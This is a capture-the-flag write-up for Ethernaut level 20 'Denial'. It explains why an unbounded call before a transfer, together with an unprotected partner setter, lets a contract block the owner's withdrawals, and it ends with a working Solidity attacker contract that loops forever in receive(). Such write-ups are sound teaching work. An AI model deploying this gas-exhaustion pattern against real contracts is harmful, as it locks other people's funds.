---
title: "Ethernaut 20 Denial"
description: "Ethernaut 20 Denial writeup"
---

## Challenge
### Description
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
Things that might help
Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
## Background

---

In Solidity, when you do not specify a gas amount, like `address.call{value: amount}("")`, most of the gas that can be forwarded at the time of the call is passed to the callee contract. If the callee's `receive` or `fallback` function performs heavy computation or runs an endless loop, it can burn through the caller's remaining gas as well.
`Denial.withdraw()` does not check the return value of `partner.call(...)`. In this challenge, though, gas matters more than the return value. If all gas is consumed during the external call, execution never reaches the following `owner.transfer(...)`.

---

`transfer` forwards only 2300 gas to the recipient. It used to be recommended as a safe way to send ether for simple transfers, and here it contrasts with the `call` before it.
`withdraw()` first does a `call` to `partner`, then a `transfer` to `owner`. If the `call` uses up all the gas, the `transfer` never runs. The goal of this challenge is to keep the `owner`'s withdrawal failing.

---

This challenge differs slightly from the typical pattern of draining a balance with a reentrancy attack. Because `partner.call(...)` executes first, the setup resembles reentrancy, but the level's condition is "prevent the owner from withdrawing while the contract still holds funds."
The attacker becomes the `partner` and prepares a contract that consumes the remaining gas when it receives ether. That makes the entire `withdraw()` run out of gas and fail, which is the DoS.
## Code analysis

---

The first piece is `partner`, which anyone can change.
```solidity
function setWithdrawPartner(address _partner) public {
    partner = _partner;
}
```
`setWithdrawPartner` has no access control. Any address can be registered as `partner`, including a contract address.
So the attacker deploys a contract with a malicious `receive` function and registers its address as `partner`. When `withdraw()` is then called, control flow is handed over to the attacker contract.

---

Next is `withdraw()`, where the external call runs first.
```solidity
function withdraw() public {
    uint256 amountToSend = address(this).balance / 100;
    partner.call{value: amountToSend}("");
    payable(owner).transfer(amountToSend);
    timeLastWithdrawn = block.timestamp;
    withdrawPartnerBalances[partner] += amountToSend;
}
```
`withdraw()` computes 1% of the balance and sends ether to `partner` first. Only afterward does it send the same amount to `owner`.
An external call before the state update is risky on its own, but the direct problem here is that `partner.call` does not limit gas. If the attacker contract's `receive` keeps consuming gas, execution never reaches `owner.transfer(amountToSend)`.

---

Last is the `call` whose return value is ignored.
```solidity
partner.call{value: amountToSend}("");
payable(owner).transfer(amountToSend);
```
The comment says "recipient can revert, the owner will still get their share." That holds for a plain `revert`: the `call` returns `false` and execution moves on to the next line.
Consuming all the gas is different. No gas remains to continue execution, so ignoring the return value no longer helps. The attack therefore goes for gas exhaustion instead of a `revert`.
## Solution
First deploy the attacker contract and register it as `partner` with `setWithdrawPartner(address(this))`. When the Ethernaut level then calls `withdraw()`, `Denial` executes `partner.call{value: amountToSend}("")`.
At that point the attacker contract's `receive()` runs. Running an endless loop inside `receive()` keeps consuming the gas forwarded by the `call`. `withdraw()` is then left without the gas to run `owner.transfer(amountToSend)` and fails.
Since the level only asks you to block the owner's withdrawal, the most direct method is to consume all the gas the `call` forwards.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Attack {
    IDenial private immutable denial;

    constructor(address _denial) {
        denial = IDenial(_denial);
    }

    function attack() external {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
```
![screenshot](./image-1.png)
